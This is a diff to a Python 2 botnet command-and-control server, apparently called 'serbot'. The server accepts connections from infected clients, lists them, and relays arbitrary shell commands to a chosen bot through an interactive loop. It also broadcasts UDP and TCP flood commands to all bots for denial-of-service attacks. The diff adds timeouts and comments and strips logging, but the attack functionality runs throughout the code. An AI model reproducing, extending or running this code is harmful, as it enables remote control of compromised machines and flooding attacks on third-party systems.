@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 
-import os, sys, time, datetime
+import os, sys, time
 from socket import *
 
 if (len(sys.argv) == 4):
@@ -22,164 +22,152 @@ Blog: http://dotcppfile.worpdress.com"
 """
 
 s=socket(AF_INET, SOCK_STREAM)
-s.settimeout(5)
-s.bind(("0.0.0.0",port)) 
+s.settimeout(5) #5 seconds are given for every operation by socket `s`
+s.bind(("0.0.0.0",port))
 s.listen(5)
 
+bridge=socket(AF_INET, SOCK_STREAM)
+bridge.bind(("0.0.0.0",bridgeport))
+bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+
 allConnections = []
-allAddresses = []	
+allAddresses = []
 
-def updateLogs(newlog):
-	time = datetime.datetime.now()	
-	newlog = "[%s] %s\n" % (time, newlog)
-	f = open("serbot-logs.txt", "a")	
-	f.write(newlog)
-	f.close()
-
+#Close all Connections-->
 def quitClients():
 	for item in allConnections:
 		try:
 			item.send("exit")
 			item.close()
-		except Exception, error:
-			updateLogs(error)
+		except: #Connection already closed
+			pass
 
 	del allConnections[:]
 	del allAddresses[:]	
+#<--
 
+#Get Client Connections-->
 def getConnections():
-	for item in allConnections:
-		item.close()
-
-	del allConnections[:]
-	del allAddresses[:]
+	quitClients()
 
 	while 1:
 		try:
-			q,addr=s.accept()
-			q.setblocking(1)
-			allConnections.append(q)
+			q,addr=s.accept() #Lasts 5 seconds and then Exception is raised
+			q.setblocking(1) #Every new socket has no timeout; every operation takes its time.
+			allConnections.append(q) #Holding our New Connections/Sockets
 			allAddresses.append(addr)
-		except:
+		except: #Time's up
 			break
+#<--
+
+#Proper Sending to Controller-->
+def sendController(msg, q):
+	try:
+		q.send(msg)
+		return 1 #success
+	except: return 0 #fail
+#<--
 
 def main():
-	bridge=socket(AF_INET, SOCK_STREAM)
-	bridge.bind(("0.0.0.0",bridgeport))
-	bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 	while 1:
-		bridge.listen(1)
+		bridge.listen(0) #There is no Queue; no one waits, 1 valid controller connection or nothing.
 		q,addr=bridge.accept()
 
-		cpass = q.recv(10240)
-		if (cpass == password):
-			loginsucc=True
-		else:
-			loginsucc=False
+		cpass = q.recv(20480)
+		
+		if (cpass == password): loginsucc=True
+		else: loginsucc=False
+
+		timeout = time.time() + 500 #A Controller can't stay here forever, only 5 minutes are given. He should connect back if needed. This is added incase a Controller forgot to close the connection himself and went out on a date...
 
 		breakit = False
 		while 1:
-			if (loginsucc == False):
-				quitClients()
-				break
+			if (loginsucc == False): break #Wrong Pass; the controller gets kicked
 
-			if (breakit == True):
-				quitClients()
-				break
+			if ((time.time() > timeout) or (breakit == True)): break #5 minutes passed; the controller gets kicked
 
-			timeout = time.time() + 600
-			if (time.time() > timeout):
-				quitClients()
-				break
+			try: command = q.recv(20480)
+			except: break #Get back to the top if we can't recieve the command; we wait again for a new Controller (same for everything that comes next)
 
-			command = q.recv(10240)
 			if (command == "accept"):
 				getConnections()
-				q.send("[INFO] Done Accepting\n")
+				if (sendController("[SERVER] Done Accepting\n", q) == 0): break #Get back to the top if we can't send to the controller; we wait again for a new controller (same for everything that comes next)
+
 			elif(command == "list"):
 				temporary = ""
-				for item in allAddresses:
-					temporary += "%d - %s|%s\n" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
+				for item in allAddresses: temporary += "%d - %s|%s\n" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
 				if (temporary != ""):
-					q.send(temporary)
+					if (sendController(temporary, q) == 0): break
 				else:
-					q.send("[INFO] No clients\n")
+					if (sendController("[SERVER] No clients\n", q) == 0): break
+
 			elif("interact " in command):
 				chosenone = int(command.replace("interact ","")) - 1
 				if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
-					q.send("[INFO] Interacting with %s\n" % str(allAddresses[chosenone]))
+					if (sendController("[SERVER] Interacting with %s\n" % str(allAddresses[chosenone]), q) == 0): break
+
 					try:
 						allConnections[chosenone].send("hellows123")
-						vtpath = allConnections[chosenone].recv(10240) + ">"
-						q.send(vtpath)
-					
+						vtpath = allConnections[chosenone].recv(20480) + "> "
+
+						if (sendController(vtpath, q) == 0): break
+
 						while 1:
-							if (time.time() > timeout):
+							if (time.time() > timeout): #5 minutes passed, we set `breakit` to true and go back to the top
 								breakit = True
 								break
 
-							try:
-								data=q.recv(10240)
-								if ((data != "stop") and ("cd " not in data) and ("udpflood " not in data) and ("tcpflood " not in data)):
-									try:
-										allConnections[chosenone].send(data)
-										msg=allConnections[chosenone].recv(10240)
-										q.send(msg)							
-									except:
-										q.send("[ERROR] Client closed the connection\n")
-										break
-								elif ("cd " in data):
-									try:
-										allConnections[chosenone].send(data)
-										msg=allConnections[chosenone].recv(10240)
-										vtpath = msg + ">"
-							
-										q.send(vtpath)
-									except:
-										q.send("[ERROR] Client closed the connection\n")
-										break
-								elif ("udpflood " in data or "tcpflood " in data):
-									try:
-										allConnections[chosenone].send(data)
-										q.send("[INFO] Command sent\n")
-									except:
-										q.send("[ERROR] Client closed the connection\n")
-										break
-								
-								elif (data == "stop"):
-									break
+							try: data=q.recv(20480) #Recieves command
 							except:
-								quitClients()
+								breakit = True
+								break
+							
+							try: #Pass it out to Client and Send back the Response
+								if ("cd " in data):
+									allConnections[chosenone].send(data)
+									msg=allConnections[chosenone].recv(20480)
+									vtpath = msg + "> "
+									if (sendController(vtpath, q) == 0):
+										breakit = True
+										break
+								elif (data == "stop"): break #We stop interacting and wait for another command
+								else:
+									allConnections[chosenone].send(data)
+									msg=allConnections[chosenone].recv(20480)
+									if (sendController(msg, q) == 0):
+										breakit = True
+										break
+							except:
+								if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):
+									breakit = True
+									break
 								break
 					except:
-						q.send("[ERROR] Client closed the connection\n")
+						if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):break
+						getConnections()
 				else:
-					q.send("[ERROR] Client doesn't exist\n")
+					if (sendController("[SERVER - ERROR] Client doesn't exist\n", q) == 0): break
+
 			elif ("udpfloodall " in command or "tcpfloodall " in command):
 				for item in allConnections:
 					try:
 						item.send(command)
-					except Exception, error:
-						updateLogs(error)
+					except:
+						pass
+
 			elif(command == "quit"):
 				quitClients()
+				q.close()
 				break
 			else:
-				q.send("[ERROR] Invalid Command\n")
-
+				if (sendController("[SERVER - ERROR] Invalid Command\n", q) == 0): break
 
 while 1:
 	try:		
 		main()
 	except KeyboardInterrupt:
-		try:
-			quitClients()
+		quitClients()
+	except:
+		quitClients()
 
-			del allConnections[:]
-			del allAddresses[:]
-		except Exception, error:
-			updateLogs(error)
-	except Exception, error:
-		updateLogs(error)
-	
-	time.sleep(5)
+	time.sleep(5) #Wait 5 Seconds before we start again
